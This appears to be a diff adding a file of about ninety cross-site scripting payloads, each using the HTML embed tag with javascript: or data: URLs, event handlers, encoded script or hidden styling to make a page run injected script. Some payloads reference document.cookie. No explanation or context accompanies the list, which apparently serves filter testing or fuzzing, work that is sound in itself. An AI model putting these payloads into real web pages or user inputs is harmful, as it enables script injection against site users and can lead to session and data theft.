@@ -1,0 +1,90 @@
+<embed src="javascript:alert(1)">
+<embed src="data:text/html,<script>alert(2)</script>">
+<embed src="javascript:alert(document.domain)">
+<embed src="javascript:alert(document.cookie)">
+<embed src="javascript:alert(window.location)">
+<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgzKTs8L3NjcmlwdD4=">
+<embed src="javascript:confirm(7)">
+<embed src="javascript:prompt(8)">
+<embed src="data:text/html,<body onload=alert(9)>">
+<embed src="data:text/html,<img src=x onerror=alert(10)>">
+<embed src="data:text/html,<svg/onload=alert(11)>">
+<embed src="data:text/html,<iframe src=javascript:alert(12)>">
+<embed src="data:text/html,<body onresize=alert(13)>">
+<embed src="data:text/html,<input autofocus onfocus=alert(14)>">
+<embed src="data:text/html,<script>setTimeout(alert,1000,15)</script>">
+<embed src="javascript:alert('XSS16')">
+<embed src="javascript:alert('XSS17')" type="text/html">
+<embed src="javascript:alert('XSS18')" type="application/xhtml+xml">
+<embed src="javascript:alert('XSS19')" type="image/svg+xml">
+<embed src="data:text/html,<body onunload=alert(20)>">
+<embed src="data:text/html,<object data='javascript:alert(21)'></object>">
+<embed src="data:text/html,<script src='data:text/javascript,alert(22)'></script>">
+<embed src="javascript:alert(String.fromCharCode(88,83,83))">
+<embed src="data:text/html,<body onload=confirm(23)>">
+<embed src="data:text/html,<body onload=prompt(24)>">
+<embed src="data:text/html,<svg><script>alert(25)</script></svg>">
+<embed src="javascript:alert(26)" width="0" height="0">
+<embed src="javascript:alert(27)" style="display:none">
+<embed src="javascript:alert(28)" tabindex="0">
+<embed src="javascript:alert(29)" onfocus="alert(30)">
+<embed src="javascript:alert(31)" onmouseenter="alert(32)">
+<embed src="javascript:alert(33)" onmouseleave="alert(34)">
+<embed src="javascript:alert(35)" onmouseover="alert(36)">
+<embed src="javascript:alert(37)" onmouseout="alert(38)">
+<embed src="data:text/html,<img src=x onerror=alert(39)>">
+<embed src="data:text/html,<iframe src='javascript:alert(40)'></iframe>">
+<embed src="data:text/html,<embed src='javascript:alert(41)'>">
+<embed src="data:text/html,<body onscroll=alert(42)>">
+<embed src="data:text/html,<video src=x onerror=alert(43)>">
+<embed src="data:text/html,<audio src=x onerror=alert(44)>">
+<embed src="data:text/html,<form onsubmit=alert(45)><input type=submit></form>">
+<embed src="javascript:alert(46)" name="xss">
+<embed src="javascript:alert(47)" id="xss">
+<embed src="javascript:alert(48)" class="xss">
+<embed src="javascript:alert(49)" style="visibility:hidden">
+<embed src="javascript:alert(50)" onload="alert(51)">
+<embed src="javascript:alert(52)" onerror="alert(53)">
+<embed src="data:text/html,<body onfocus=alert(54)>">
+<embed src="data:text/html,<body onblur=alert(55)>">
+<embed src="data:text/html,<svg onload=alert(56)>">
+<embed src="data:text/html,<svg><animate onbegin=alert(57)></animate></svg>">
+<embed src="data:text/html,<style>@keyframes x{}</style><body onanimationiteration=alert(58)>">
+<embed src="data:text/html,<marquee onstart=alert(59)>">
+<embed src="data:text/html,<details ontoggle=alert(60)>">
+<embed src="data:text/html,<summary onclick=alert(61)>">
+<embed src="javascript:alert(62)" tabindex="-1">
+<embed src="javascript:alert(63)" draggable="true">
+<embed src="javascript:alert(64)" contenteditable="true">
+<embed src="javascript:alert(65)" spellcheck="false">
+<embed src="javascript:alert(66)" role="alert">
+<embed src="javascript:alert(67)" aria-hidden="false">
+<embed src="javascript:alert(68)" hidden>
+<embed src="javascript:alert(69)" draggable="false">
+<embed src="javascript:alert(70)" data-xss="true">
+<embed src="javascript:alert(71)" accesskey="x">
+<embed src="javascript:alert(72)" lang="en">
+<embed src="javascript:alert(73)" dir="ltr">
+<embed src="javascript:alert(74)" tabindex="1">
+<embed src="javascript:alert(75)" translate="yes">
+<embed src="javascript:alert(76)" spellcheck="true">
+<embed src="javascript:alert(77)" autocapitalize="off">
+<embed src="javascript:alert(78)" autocorrect="off">
+<embed src="javascript:alert(79)" role="button">
+<embed src="javascript:alert(80)" aria-pressed="true">
+<embed src="javascript:alert(81)" aria-label="XSS">
+<embed src="javascript:alert(82)" aria-live="polite">
+<embed src="javascript:alert(83)" aria-atomic="true">
+<embed src="javascript:alert(84)" aria-relevant="additions">
+<embed src="javascript:alert(85)" aria-disabled="false">
+<embed src="javascript:alert(86)" aria-expanded="true">
+<embed src="javascript:alert(87)" aria-haspopup="true">
+<embed src="javascript:alert(88)" aria-hidden="true">
+<embed src="javascript:alert(89)" style="opacity:0;">
+<embed src="javascript:alert(90)" style="position:absolute;left:-9999px;">
+<embed src="javascript:alert(91)" style="width:0;height:0;">
+<embed src="javascript:alert(92)" onfocusin="alert(93)">
+<embed src="javascript:alert(94)" onfocusout="alert(95)">
+<embed src="javascript:alert(96)" onpointercancel="alert(97)">
+<embed src="javascript:alert(98)" onpointerdown="alert(99)">
+<embed src="javascript:alert(100)" onpointerup="alert(101)">
